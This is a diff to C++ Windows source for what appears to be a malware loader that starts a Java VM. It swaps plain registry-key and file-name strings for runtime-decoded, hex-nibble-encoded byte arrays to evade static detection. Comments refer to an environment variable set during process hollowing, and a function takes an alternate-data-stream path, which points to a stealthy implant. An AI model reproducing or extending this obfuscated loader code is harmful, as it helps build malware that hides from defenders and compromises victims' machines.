@@ -126,7 +126,7 @@ char *GetJvmPath(){
 
 	//Check registry first
 	//SOFTWARE\JavaSoft\Java Runtime Environment
-	char *key_str = "SOFTWARE\\JavaSoft\\Java Runtime Environment";
+	char *key_str = decode_split("\x5\x3\x4\xf\x4\x6\x5\x4\x5\x7\x4\x1\x5\x2\x4\x5\x5\xc\x5\xc\x4\xa\x6\x1\x7\x6\x6\x1\x5\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x4\xa\x6\x1\x7\x6\x6\x1\x2\x0\x5\x2\x7\x5\x6\xe\x7\x4\x6\x9\x6\xd\x6\x5\x2\x0\x4\x5\x6\xe\x7\x6\x6\x9\x7\x2\x6\xf\x6\xe\x6\xd\x6\x5\x6\xe\x7\x4",88);
 	HKEY hKey;
     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, key_str, 0, KEY_READ, &hKey) == ERROR_SUCCESS){
 
@@ -137,13 +137,16 @@ char *GetJvmPath(){
 
 		//Get current version
 		//CurrentVersion
-		char *name = "CurrentVersion";
+		char *name = decode_split("\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe",28);
 		if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
+			//free memory
+			free(name);
 			//If the return type is a string
 			if (type == REG_SZ && length > 0){
 
 				//Add the current version and attempt to get JVM path
 				std::string cur_ver_key(key_str);
+				free(key_str);
 				cur_ver_key.append("\\").append(buf);
 
 				//Close previous key
@@ -156,9 +159,11 @@ char *GetJvmPath(){
 					memset(buf,0, MAX_PATH);
 
 					//Get current version
-					//CurrentVersion
-					name = "RuntimeLib";
+					//RuntimeLib
+					name = decode_split("\x5\x2\x7\x5\x6\xe\x7\x4\x6\x9\x6\xd\x6\x5\x4\xc\x6\x9\x6\x2",20);
 					if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
+						//free memory
+						free(name);
 						//If the return type is a string
 						if (type == REG_SZ && length > 0){
 							ret_path = (char *)calloc(length, 1);
@@ -241,13 +246,55 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
 	jstring jstr;
 	
 	std::string sJavaVersion, sJavaRoot;
-	char* jvmPath = GetJvmPath();
+
+	//Get JVM lib env - this is the one we set in proc hollow
+	//PS_HOME
+	char *java_home = decode_split("\x5\x0\x5\x3\x5\xf\x4\x8\x4\xf\x4\xd\x4\x5",14);
+	char * tmp_env = nullptr;
+	size_t len;
+	//Get env var
+	_dupenv_s (&tmp_env, &len, java_home);
+	free(java_home);
+
+	//Set the jvm path
+	char* jvmPath;
+	if( tmp_env && strlen(tmp_env) > 0 ){
+
+		//Append the jvm dll
+		std::string jvmPathStr(tmp_env);
+		//\jvm.dll
+		char *dec_jvm = decode_split("\x5\xc\x6\xa\x7\x6\x6\xd\x2\xe\x6\x4\x6\xc\x6\xc",16);
+		jvmPathStr.append(dec_jvm);
+		free(dec_jvm);
+		
+		//Set jvmPath
+		jvmPath = (char *)calloc( jvmPathStr.length() + 1, 1);
+		memcpy(jvmPath, jvmPathStr.c_str(), jvmPathStr.length());
+	
+	} else {
+		//Check registry
+		jvmPath = GetJvmPath();
+	}
+
+	//Free mem
+	if( tmp_env )
+		free(tmp_env);
+
+
 	if( jvmPath == nullptr ){
 #ifdef _DBG
 		//Print the last error
 		Log("Unable to find java runtime DLL path.\n", GetLastError());					
 #endif
 		return FALSE;
+
+	} else {
+
+#ifdef _DBG
+		//Print the last error
+		Log("Java runtime DLL path: %s.\n", jvmPath);					
+#endif
+
 	}
 
 	//boolean libraryFound = LoadJava();
